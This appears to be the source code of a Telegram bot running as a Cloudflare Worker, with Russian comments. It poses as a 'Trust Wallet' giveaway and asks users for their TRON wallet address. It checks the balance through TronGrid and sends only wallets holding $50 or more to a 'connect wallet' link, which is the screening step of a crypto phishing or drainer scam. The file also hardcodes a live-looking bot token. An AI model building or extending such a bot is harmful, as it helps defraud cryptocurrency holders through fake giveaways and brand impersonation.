// ============================================================
// НАСТРОЙКИ
// ============================================================
const BOT_TOKEN = "8967784999:AAFTnFXi1tE4USBH4eQEF_CkrfJpqbcH3uI"; // Твой токен
const PHOTO_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaG1Ay-no9Desc-6ZsW9vLJlUL4j2cVyNHDKs_OMgGBg&s=10";
const REGISTRATION_LINK = "https://t.me/YOUR_CHANNEL_OR_LINK"; // Сюда ссылка для прошедших проверку
const MIN_BALANCE_USD = 50;
const TRX_PRICE_USD = 0.25; // Примерный курс TRX, можно обновлять вручную

// ============================================================
// ОСНОВНОЙ ХЕНДЛЕР
// ============================================================
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // Если это webhook от Telegram
    if (url.pathname === "/webhook") {
      const update = await request.json();
      
      // Обрабатываем сообщение
      if (update.message) {
        const msg = update.message;
        const chatId = msg.chat.id;
        const text = msg.text || "";

        // 1. Команда /start
        if (text === "/start") {
          await sendStartMessage(chatId);
        } 
        // 2. Нажатие кнопки "Участвовать"
        else if (text === "🎁 Участвовать в розыгрыше") {
          await askForWallet(chatId);
        }
        // 3. Проверка адреса кошелька (начинается с T и длина 34)
        else if (text.match(/^T[A-Za-z0-9]{33}$/)) {
          await checkBalanceAndReply(chatId, text);
        }
        // 4. Все остальное
        else {
           // Игнорируем или просим нажать кнопку
        }
      }
      
      return new Response("OK", { status: 200 });
    }

    // Для проверки работы воркера через браузер
    return new Response("Bot is running via Webhook", { status: 200 });
  },
};

// ============================================================
// ЛОГИКА БОТА
// ============================================================

async function sendStartMessage(chatId) {
  const caption = 
    "🔥 <b>МЕГА РОЗЫГРЫШ ОТ TRUST WALLET</b>\n\n" +
    "🏆 <b>Призовой фонд:</b>\n" +
    "• 3 победителя по $2000\n" +
    "• 5 победителей по $500\n\n" +
    "✅ Участие абсолютно бесплатно!\n" +
    "⚠️ <b>Важно:</b> Пустые кошельки не участвуют. Минимальный баланс для допуска — <b>$50</b>.\n\n" +
    "Нажми кнопку ниже, чтобы начать 👇";

  const keyboard = {
    inline_keyboard: [
      [{ text: "🎁 Участвовать в розыгрыше", callback_data: "participate" }]
    ]
  };

  // Используем sendPhoto
  await tgRequest("sendPhoto", {
    chat_id: chatId,
    photo: PHOTO_URL,
    caption: caption,
    parse_mode: "HTML",
    reply_markup: JSON.stringify(keyboard)
  });
}

async function askForWallet(chatId) {
  // Обработка callback_query требует ответа, но мы просто отправим новое сообщение
  // Чтобы упростить, отправляем текстовое сообщение с просьбой адреса
  
  await tgRequest("sendMessage", {
    chat_id: chatId,
    text: "📩 <b>Проверка кошелька</b>\n\n" +
          "Отправьте мне ваш адрес кошелька <b>TRC-20</b> (начинается на T...).\n\n" +
          "<i>Я проверю баланс в фоне и скажу, можете ли вы участвовать.</i>",
    parse_mode: "HTML"
  });
}

async function checkBalanceAndReply(chatId, address) {
  // Сначала отправляем статус "Проверяю..."
  const loadingMsg = await tgRequest("sendMessage", {
    chat_id: chatId,
    text: "⏳ <i>Проверяю баланс в сети TRON...</i>",
    parse_mode: "HTML"
  });

  try {
    const balanceData = await getTronBalance(address);
    
    if (balanceData.error) {
      await editMessage(chatId, loadingMsg.result.message_id, `❌ Ошибка: ${balanceData.error}`);
      return;
    }

    const totalUsd = balanceData.totalUsd;

    if (totalUsd >= MIN_BALANCE_USD) {
      // УСПЕХ
      const successText = 
        `✅ <b>Кошелек подходит!</b>\n\n` +
        `Баланс подтвержден (> $${MIN_BALANCE_USD}).\n` +
        `Вы допущены к участию в розыгрыше.\n\n` +
        `👇 Нажмите кнопку ниже для финальной регистрации:`;
      
      const kb = {
        inline_keyboard: [
          [{ text: "🚀 Подключить кошелек", url: REGISTRATION_LINK }]
        ]
      };

      await editMessage(chatId, loadingMsg.result.message_id, successText, kb);
    } else {
      // НЕУДАЧА
      const failText = 
        `❌ <b>Кошелек не подходит</b>\n\n` +
        `Ваш примерный баланс: ~$${totalUsd.toFixed(2)}\n` +
        `Минимальное требование: <b>$${MIN_BALANCE_USD}</b>\n\n` +
        `Пополните кошелек или используйте другой.`;
      
      await editMessage(chatId, loadingMsg.result.message_id, failText);
    }

  } catch (e) {
    await editMessage(chatId, loadingMsg.result.message_id, "❌ Техническая ошибка при проверке.");
    console.error(e);
  }
}

// ============================================================
| API ФУНКЦИИ
// ============================================================

// Запрос к TronGrid API
async function getTronBalance(address) {
  try {
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
    const data = await response.json();

    if (!data.data || data.data.length === 0) {
      return { error: "Кошелек не найден или пуст." };
    }

    const account = data.data[0];
    
    // 1. Баланс TRX (в sun)
    const trxBalance = (account.balance || 0) / 1_000_000;
    
    // 2. Баланс USDT (TRC-20)
    let usdtBalance = 0;
    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    
    if (account.trc20) {
      for (const key in account.trc20) {
        if (key.includes(usdtContract)) {
          usdtBalance = account.trc20[key] / 1_000_000;
          break;
        }
      }
    }

    // Расчет в USD
    const trxUsd = trxBalance * TRX_PRICE_USD;
    const totalUsd = usdtBalance + trxUsd;

    return {
      trxBalance,
      usdtBalance,
      totalUsd,
      error: null
    };

  } catch (err) {
    return { error: "Не удалось подключиться к блокчейну." };
  }
}

// Отправка запроса к Telegram API
async function tgRequest(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  return await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  }).then(res => res.json());
}

// Редактирование сообщения (для смены "Загрузка" на результат)
async function editMessage(chatId, messageId, text, keyboard = null) {
  const body = {
    chat_id: chatId,
    message_id: messageId,
    text: text,
    parse_mode: "HTML"
  };
  if (keyboard) {
    body.reply_markup = JSON.stringify(keyboard);
  }
  return await tgRequest("editMessageText", body);
}
